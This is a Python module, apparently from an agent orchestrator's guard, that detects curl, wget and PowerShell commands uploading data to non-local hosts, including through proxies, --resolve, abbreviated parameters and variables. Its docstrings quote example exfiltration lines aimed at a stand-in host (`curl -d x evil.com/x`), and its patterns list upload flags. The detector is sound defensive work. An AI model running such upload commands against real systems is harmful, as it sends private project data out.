"""Upload detection of the orchestrator guard (imported by guard.py; standard library only).

`egress_upload_reason(statement)` finds curl / wget / Invoke-WebRequest (iwr) / Invoke-RestMethod (irm) that SEND data (`-d`, `-F`, `-T`, `-X POST`,
`--post-data`, `-Method Post`, `-Body`, `-InFile`...) and decides whether the destination is this machine from the URLs the command really targets, never
from a bare word: `-H "Host: localhost"` does not make `curl -d x evil.com/x` local. A URL needs no scheme (`localhost:3000/x`, `evil.com/x`); a proxy that is
not local, `--resolve` and `--connect-to` (they send the request elsewhere), and a URL held in a variable all make the call non-local.
PowerShell parameters may be abbreviated to any prefix (`-Me Post`, `-Bo`, `-InF`).
"""
import re
import shlex

from guard_git import quoted_ranges

EGRESS_TOOL_RE = re.compile(r"(?<![\w.-])(curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm)(?:\.exe)?(?![\w-])", re.I)
EGRESS_UPLOAD_METHODS = r"(?:POST|PUT|PATCH|DELETE)"


def _prefixes(name, shortest):
    """Alternation of every prefix of `name` from `shortest` letters up (longest first): how PowerShell accepts an abbreviated parameter."""
    return "|".join(name[:length] for length in range(len(name), shortest - 1, -1))


# PowerShell: `-Body` / `-InFile` / `-Form` / `-CustomMethod` in full or as the shortest prefix that is not ambiguous (`-B`, `-InF`, `-Fo`, `-Cu`...)
_PS_UPLOAD_PARAM = r"(?<![\w-])-(?:%s|%s|%s|%s)(?![\w-])" % (_prefixes("Body", 1), _prefixes("InFile", 3), _prefixes("Form", 2), _prefixes("CustomMethod", 2))
_PS_METHOD_PARAM = "(?:%s|%s)" % (_prefixes("Method", 2), _prefixes("CustomMethod", 2))
EGRESS_UPLOAD_RES = {
    "curl": [re.compile(r"(?<![\w-])-[A-Za-z0-9]*[dFT][A-Za-z0-9]*(?=\s|$)|(?<![\w-])--(?:data[\w-]*|form[\w-]*|upload-file|json)(?![\w-])")],
    "wget": [re.compile(r"(?<![\w-])--(?:post-data|post-file|body-data|body-file)(?![\w-])", re.I)],
    "powershell": [re.compile(_PS_UPLOAD_PARAM, re.I)],
}
EGRESS_METHOD_RES = {
    "curl": re.compile(r"(?<![\w-])(?:-X|--request)(?:\s+|=)?" + EGRESS_UPLOAD_METHODS + r"(?![\w-])", re.I),
    "wget": re.compile(r"(?<![\w-])--method(?:\s+|=)" + EGRESS_UPLOAD_METHODS + r"(?![\w-])", re.I),
    "powershell": re.compile(r"(?<![\w-])-" + _PS_METHOD_PARAM + r"[\s:=]+" + EGRESS_UPLOAD_METHODS + r"(?![\w-])", re.I),
}
LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1", "[::1]", "0.0.0.0"}
SCHEME_RE = re.compile(r"^[A-Za-z][A-Za-z0-9+.-]*://")
PROXY_ENV_RE = re.compile(r"(?<![\w-])(?:https?_proxy|all_proxy)=(\S+)", re.I)

# options that take the NEXT word as their value, so the value is not mistaken for a URL
CURL_VALUE_SHORT = set("AbcCdDeEFHKmoPQrTuUwxXyYz")
CURL_VALUE_LONG = {"--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "--form", "--form-string", "--header", "--output", "--user", "--user-agent",
                   "--referer", "--cookie", "--cookie-jar", "--request", "--upload-file", "--max-time", "--connect-timeout", "--retry", "--retry-delay", "--retry-max-time",
                   "--limit-rate", "--cert", "--key", "--cacert", "--capath", "--write-out", "--range", "--url-query", "--json", "--config", "--dump-header", "--trace",
                   "--trace-ascii", "--proxy-user", "--oauth2-bearer", "--aws-sigv4", "--interface", "--local-port", "--max-filesize", "--max-redirs", "--time-cond",
                   "--variable", "--unix-socket", "--noproxy", "--doh-url", "--quote", "--pinnedpubkey", "--cert-type", "--key-type", "--cookie-jar", "--continue-at"}
CURL_PROXY_OPTIONS = {"-x", "--proxy", "--preproxy", "--socks4", "--socks4a", "--socks5", "--socks5-hostname"}
CURL_REDIRECT_OPTIONS = {"--resolve", "--connect-to"}
WGET_VALUE_OPTIONS = {"-O", "-o", "-a", "-P", "-t", "-T", "-w", "-Q", "-l", "-i", "-B", "-U", "--header", "--post-data", "--post-file", "--body-data", "--body-file", "--method",
                      "--user", "--password", "--proxy-user", "--proxy-password", "--http-user", "--http-password", "--referer", "--user-agent", "--load-cookies",
                      "--save-cookies", "--directory-prefix", "--output-document", "--output-file", "--tries", "--timeout", "--wait", "--limit-rate", "--bind-address",
                      "--certificate", "--private-key", "--ca-certificate"}
PS_VALUE_PARAMS = ["Uri", "Method", "Body", "InFile", "OutFile", "Headers", "ContentType", "Credential", "Proxy", "ProxyCredential", "UserAgent", "TimeoutSec",
                   "MaximumRedirection", "MaximumRetryCount", "RetryIntervalSec", "Authentication", "Token", "Certificate", "CertificateThumbprint", "SslProtocol",
                   "TransferEncoding", "WebSession", "SessionVariable", "ResponseHeadersVariable", "StatusCodeVariable", "Form", "CustomMethod", "ErrorAction",
                   "ErrorVariable", "WarningAction", "WarningVariable", "OutVariable", "OutBuffer", "InformationAction", "InformationVariable", "PipelineVariable"]
PS_SWITCH_PARAMS = ["UseBasicParsing", "AllowUnencryptedAuthentication", "DisableKeepAlive", "NoProxy", "PassThru", "PreserveAuthorizationOnRedirect",
                    "ProxyUseDefaultCredentials", "Resume", "SkipCertificateCheck", "SkipHeaderValidation", "SkipHttpErrorCheck", "UseDefaultCredentials", "FollowRelLink",
                    "Verbose", "Debug"]


def is_local_host(authority):
    """True for localhost, 127.0.0.1, [::1], 0.0.0.0 and *.localhost (user info and port ignored: `http://localhost@evil.com` is evil.com)."""
    host = authority.rsplit("@", 1)[-1].lower()
    host = host[:host.index("]") + 1] if host.startswith("[") and "]" in host else host.split(":")[0]
    return host in LOCAL_HOSTS or host.endswith(".localhost")


def authority_of(target):
    """Host part of a URL or schemeless `host[:port][/path]`."""
    text = SCHEME_RE.sub("", target.strip("\"'"))
    return re.split(r"[/?#]", text, maxsplit=1)[0]


def looks_like_target(token):
    """A word that can be the destination: a URL, `host:port`, `host.tld/path`, `localhost`, or a variable/sub-shell (which cannot be proven local).
    Not an option value that slipped through (`1M`), a header, a hash table or a file name with no path."""
    if not token or token.startswith(("-", "@")) or re.search(r"[\s{};=]", authority_of(token)) and not SCHEME_RE.match(token):
        return False
    return bool(SCHEME_RE.match(token) or token.lower().startswith("localhost") or re.search(r"[.:$%(\[`]", token))


def ps_param(token):
    """(full parameter name or None, switch?) of a PowerShell `-Param` written in full or as an unambiguous prefix (several candidates: a value is expected)."""
    name = token.lstrip("-").split(":", 1)[0].lower()
    if not name:
        return None, False
    everything = PS_VALUE_PARAMS + PS_SWITCH_PARAMS
    exact = [item for item in everything if item.lower() == name]
    candidates = exact or [item for item in everything if item.lower().startswith(name)]
    if not candidates:
        return None, False
    if len(candidates) == 1:
        return candidates[0], candidates[0] in PS_SWITCH_PARAMS
    return None, all(item in PS_SWITCH_PARAMS for item in candidates)


def destinations(rest, family):
    """(targets, redirected): the destination words of one upload command and whether something sends it elsewhere (a non-local proxy, `--resolve`, `--connect-to`)."""
    try:
        words = shlex.split(rest, posix=False)
    except ValueError:
        words = rest.split()
    raw_words, words, skip = words[1:], [], False
    for word in (word.strip("\"'") for word in raw_words):
        if skip:  # the target of a redirection (`> out.json`), not a destination
            skip = False
        elif re.match(r"^(?:\d*|&)(?:>>?|<)$", word):
            skip = True
        elif not re.match(r"^(?:\d*|&)(?:>>?|<)", word):
            words.append(word)
    targets, redirected, index = [], False, 0
    while index < len(words):
        word = words[index]
        index += 1
        if not word.startswith("-"):
            if looks_like_target(word):
                targets.append(word)
            continue
        if family == "powershell":
            parameter, switch = ps_param(word)
            _, colon, value = word.lstrip("-").partition(":")
            if not colon:
                value = None
                if not switch and index < len(words):
                    value, index = words[index], index + 1
            if parameter == "Uri" and value:
                targets.append(value)
            elif parameter == "Proxy" and value and not is_local_host(authority_of(value)):
                redirected = True
            continue
        option, equals, value = word.partition("=") if word.startswith("--") else (word, "", None)
        if not equals:
            value = None
        if family == "wget" or option.startswith("--"):
            known = WGET_VALUE_OPTIONS | {"-e", "--execute"} if family == "wget" else CURL_VALUE_LONG | CURL_PROXY_OPTIONS | CURL_REDIRECT_OPTIONS | {"--url"}
            if value is None and option in known and index < len(words):
                value, index = words[index], index + 1
        else:  # a curl cluster of short options (`-sSd`, `-XPUT`, `-d@f`): the first letter that takes a value takes the rest of the word, or the next word
            for position, letter in enumerate(option[1:], 1):
                if letter in CURL_VALUE_SHORT:
                    value = option[position + 1:] or (words[index] if index < len(words) else None)
                    index += 0 if option[position + 1:] or value is None else 1
                    option = "-" + letter
                    break
        if value is None:
            continue
        if option in CURL_REDIRECT_OPTIONS:
            redirected = True
        elif option in CURL_PROXY_OPTIONS:
            redirected = redirected or not is_local_host(authority_of(value))
        elif option == "--url":
            targets.append(value)
        elif option in ("-e", "--execute") and re.search(r"proxy\s*=", value, re.I) and not is_local_host(authority_of(value.split("=", 1)[1])):
            redirected = True
    return targets, redirected


def egress_upload_reason(statement):
    """Reason when one statement uploads with curl/wget/iwr/irm to a host that is not this machine, else ''. A GET anywhere, and any method
    to a local host (route checks, E2E), pass. A URL held in a variable cannot be proven local, so it counts as non-local."""
    spans = quoted_ranges(statement)
    for tool in EGRESS_TOOL_RE.finditer(statement):
        if any(start < tool.start() < end for start, end in spans):
            continue
        rest = statement[tool.start():]
        pipe = next((index for index, char in enumerate(rest) if char == "|" and not any(start < tool.start() + index < end for start, end in spans)), len(rest))
        rest = rest[:pipe]
        family = {"curl": "curl", "wget": "wget"}.get(tool.group(1).lower(), "powershell")
        masked = rest
        for start, end in quoted_ranges(rest):
            masked = masked[:start + 1] + " " * (end - start - 1) + masked[end:]
        unquoted = rest.replace('"', "").replace("'", "")
        if not (any(pattern.search(masked) for pattern in EGRESS_UPLOAD_RES[family]) or EGRESS_METHOD_RES[family].search(unquoted)):
            continue
        targets, redirected = destinations(rest, family)
        redirected = redirected or any(not is_local_host(authority_of(proxy)) for proxy in PROXY_ENV_RE.findall(statement[:tool.start()]))
        if targets and not redirected and all(is_local_host(authority_of(target)) for target in targets):
            continue
        host = "a host held in a variable"
        if redirected:
            host = "a non-local proxy / --resolve / --connect-to target"
        else:
            host = next((authority_of(target) for target in targets if not is_local_host(authority_of(target))), host)
        return "%s uploads data to %s: the loop never sends project data out (reading, GET, is fine; local hosts are fine)" % (tool.group(1), host[:60])
    return ""
